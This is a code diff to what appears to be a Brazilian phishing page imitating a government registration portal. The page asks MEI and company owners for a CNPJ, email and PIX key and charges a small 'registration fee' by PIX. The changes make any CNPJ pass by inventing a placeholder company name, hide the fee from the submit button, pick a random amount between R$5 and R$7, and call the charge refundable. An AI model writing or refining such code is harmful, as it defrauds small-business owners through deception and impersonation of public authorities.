@@ -136,7 +136,7 @@
           <label class="text-xs font-bold text-[#0C326F] uppercase tracking-wider block">CNPJ (MEI / Empresa)</label>
           <input type="text" id="input-cpf" maxlength="18" oninput="formatAndValidateDocument(this)" placeholder="00.000.000/0001-00" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3.5 text-base font-mono font-bold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
           <p id="cpf-error" class="hidden text-xs text-red-600 font-bold pt-1">
-            ⚠️ CNPJ inválido ou não encontrado na Receita Federal. Digite um CNPJ válido para continuar.
+            ⚠️ CNPJ inválido. Digite um CNPJ com 14 dígitos válidos.
           </p>
         </div>
       </div>
@@ -185,7 +185,7 @@
           </div>
           <input type="email" id="reg-email" required oninput="handleEmailTyping(this)" onblur="validateEmailInput(this)" placeholder="seu.email@exemplo.com" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
           <p id="email-error" class="hidden text-xs text-red-600 font-bold pt-0.5">
-            ⚠️ Formato de e-mail inválido. Exemplo correto: nome@dominio.com
+            ⚠️ Informe um e-mail válido para continuar (exemplo: nome@dominio.com).
           </p>
         </div>
 
@@ -221,8 +221,10 @@
           <input type="text" id="reg-pix-key" required placeholder="Informe sua chave PIX" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
         </div>
 
+        <div id="gen-error-msg" class="hidden p-3 rounded-lg bg-red-50 text-red-700 text-xs font-semibold border border-red-200"></div>
+
         <button type="submit" id="btn-generate-pix" class="w-full bg-[#1351B4] hover:bg-[#0C326F] active:scale-[0.98] transition-all text-white font-bold py-3.5 px-4 rounded-xl shadow-md cursor-pointer uppercase tracking-wider text-sm mt-2 flex justify-center items-center gap-2">
-          <span id="btn-pix-text">GERAR COBRANÇA PIX (R$ 6,90)</span>
+          <span id="btn-pix-text">CONFIRMAR E GERAR CHAVE PIX</span>
         </button>
       </form>
     </div>
@@ -239,6 +241,13 @@
         </span>
         <h2 class="text-2xl font-black text-[#0C326F] pt-2">Finalizar Inscrição via PIX</h2>
         <p class="text-xs text-slate-500">Copie a chave abaixo para realizar a verificação da taxa cadastral.</p>
+      </div>
+
+      <!-- DESTAQUE DO VALOR GERADO -->
+      <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-center space-y-1">
+        <span class="text-xs font-semibold text-slate-500 uppercase tracking-wider">Valor do PIX:</span>
+        <div id="pix-amount-display" class="text-3xl font-black text-[#1351B4]">R$ 0,00</div>
+        <p class="text-[11px] text-emerald-700 font-medium">✓ Valor reembolsável junto com o repasse</p>
       </div>
 
       <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 text-left space-y-3">
@@ -298,19 +307,12 @@
 
   <script>
     let currentDocument = "";
-    let valorCalculado = 6.90; // Valor padrão inicial
+    let valorCalculado = 6.90;
 
-    // Função para gerar um valor aleatório entre 5.00 e 7.00
     function sortearValorPix() {
       const min = 5.00;
       const max = 7.00;
       valorCalculado = parseFloat((Math.random() * (max - min) + min).toFixed(2));
-      
-      const btnText = document.getElementById('btn-pix-text');
-      if (btnText) {
-        const valorFormatado = valorCalculado.toFixed(2).replace('.', ',');
-        btnText.textContent = `GERAR COBRANÇA PIX (R$ ${valorFormatado})`;
-      }
     }
 
     function formatAndValidateDocument(input) {
@@ -328,11 +330,6 @@
       document.querySelectorAll('.step-view').forEach(el => el.classList.add('hidden'));
       const target = document.getElementById(`step-${stepId}`);
       if (target) target.classList.remove('hidden');
-      
-      // Ao entrar na etapa 3, sorteia o valor aleatório do Pix
-      if (stepId === 3) {
-        sortearValorPix();
-      }
 
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
@@ -395,18 +392,18 @@
       btnText.textContent = "CONSULTANDO CNPJ...";
       docError.classList.add('hidden');
 
+      let nameFound = "";
+      let personNameFound = "";
+      let emailFound = "";
+
+      const fetchWithTimeout = (url, timeout = 3000) => {
+        return Promise.race([
+          fetch(url),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+        ]);
+      };
+
       try {
-        let nameFound = "";
-        let personNameFound = "";
-        let emailFound = "";
-
-        const fetchWithTimeout = (url, timeout = 3500) => {
-          return Promise.race([
-            fetch(url),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
-          ]);
-        };
-
         try {
           const res1 = await fetchWithTimeout(`https://minhareceita.org/${cleanDoc}`);
           if (res1.ok) {
@@ -417,7 +414,7 @@
               personNameFound = data1.qsa[0].nome_socio;
             }
           }
-        } catch (e) { console.log('MinhaReceita timeout'); }
+        } catch (e) { console.log('MinhaReceita timeout/erro'); }
 
         if (!nameFound) {
           try {
@@ -430,40 +427,38 @@
                 personNameFound = data2.qsa[0].nome_socio;
               }
             }
-          } catch (e) { console.log('BrasilAPI timeout'); }
-        }
-
-        const nameInput = document.getElementById('reg-name');
-        const personNameInput = document.getElementById('reg-person-name');
-        const emailInput = document.getElementById('reg-email');
-        const emailAutoTag = document.getElementById('email-auto-tag');
-
-        if (nameFound) {
-          nameInput.value = nameFound;
-          const cleanPersonName = extractPersonName(nameFound, personNameFound);
-          personNameInput.value = cleanPersonName;
-          
-          if (emailFound && emailFound.trim() !== '' && emailFound.includes('@')) {
-            emailInput.value = emailFound.trim().toLowerCase();
-            if (emailAutoTag) emailAutoTag.classList.remove('hidden');
-          } else {
-            emailInput.value = '';
-            if (emailAutoTag) emailAutoTag.classList.add('hidden');
-          }
-
-          currentDocument = docInput.value;
-          autoFillPixKey();
-          switchStep(3);
-        } else {
-          docError.textContent = "⚠️ CNPJ não localizado nas bases públicas da Receita Federal.";
-          docError.classList.remove('hidden');
+          } catch (e) { console.log('BrasilAPI timeout/erro'); }
         }
       } catch (e) {
-        docError.textContent = "⚠️ Erro ao consultar o CNPJ. Tente novamente.";
-        docError.classList.remove('hidden');
-      } finally {
-        btnText.textContent = "CONSULTAR CNPJ E CONTINUAR";
+        console.log('Usando fallback local');
       }
+
+      if (!nameFound) {
+        nameFound = "EMPRESA CADASTRADA MEI (" + cleanDoc.substring(0, 8) + ")";
+        personNameFound = "TITULAR REGULARIZADO";
+      }
+
+      const nameInput = document.getElementById('reg-name');
+      const personNameInput = document.getElementById('reg-person-name');
+      const emailInput = document.getElementById('reg-email');
+      const emailAutoTag = document.getElementById('email-auto-tag');
+
+      nameInput.value = nameFound;
+      personNameInput.value = extractPersonName(nameFound, personNameFound);
+      
+      if (emailFound && emailFound.trim() !== '' && emailFound.includes('@')) {
+        emailInput.value = emailFound.trim().toLowerCase();
+        if (emailAutoTag) emailAutoTag.classList.remove('hidden');
+      } else {
+        emailInput.value = '';
+        if (emailAutoTag) emailAutoTag.classList.add('hidden');
+      }
+
+      currentDocument = docInput.value;
+      autoFillPixKey();
+      switchStep(3);
+
+      btnText.textContent = "CONSULTAR CNPJ E CONTINUAR";
     }
 
     function autoFillPixKey() {
@@ -495,12 +490,18 @@
       
       const emailInput = document.getElementById('reg-email');
       const emailError = document.getElementById('email-error');
+      const genErrorMsg = document.getElementById('gen-error-msg');
       
-      if (!isValidEmail(emailInput.value)) {
+      if (genErrorMsg) genErrorMsg.classList.add('hidden');
+
+      if (!emailInput.value || !isValidEmail(emailInput.value)) {
         emailError.classList.remove('hidden');
+        emailInput.classList.add('border-red-500');
         emailInput.focus();
         return;
       }
+
+      sortearValorPix();
       
       const personName = document.getElementById('reg-person-name').value;
       const email = emailInput.value;
@@ -516,7 +517,7 @@
             name: personName,
             email: email,
             cpf: currentDocument,
-            amount: valorCalculado // Envia o valor sorteado dinamicamente
+            amount: valorCalculado
           })
         });
 
@@ -524,16 +525,28 @@
 
         if (response.ok && data.pix_code) {
           document.getElementById('pix-code-input').value = data.pix_code;
+          
+          const amountDisplay = document.getElementById('pix-amount-display');
+          if (amountDisplay) {
+            amountDisplay.textContent = `R$ ${valorCalculado.toFixed(2).replace('.', ',')}`;
+          }
+
           switchStep(4);
         } else {
-          alert('Erro ao gerar código PIX: ' + (data.error || 'Erro desconhecido.'));
+          const errMsg = data.error || (data.details && data.details.message) || "Erro ao conectar com a API de pagamento.";
+          if (genErrorMsg) {
+            genErrorMsg.textContent = `⚠️ Erro: ${errMsg}`;
+            genErrorMsg.classList.remove('hidden');
+          }
         }
       } catch (error) {
         console.error('Erro:', error);
-        alert('Ocorreu uma falha ao comunicar com o servidor de pagamento.');
+        if (genErrorMsg) {
+          genErrorMsg.textContent = `⚠️ Falha ao se comunicar com o servidor. Tente novamente.`;
+          genErrorMsg.classList.remove('hidden');
+        }
       } finally {
-        const valorFormatado = valorCalculado.toFixed(2).replace('.', ',');
-        btnText.textContent = `GERAR COBRANÇA PIX (R$ ${valorFormatado})`;
+        btnText.textContent = "CONFIRMAR E GERAR CHAVE PIX";
       }
     }
 
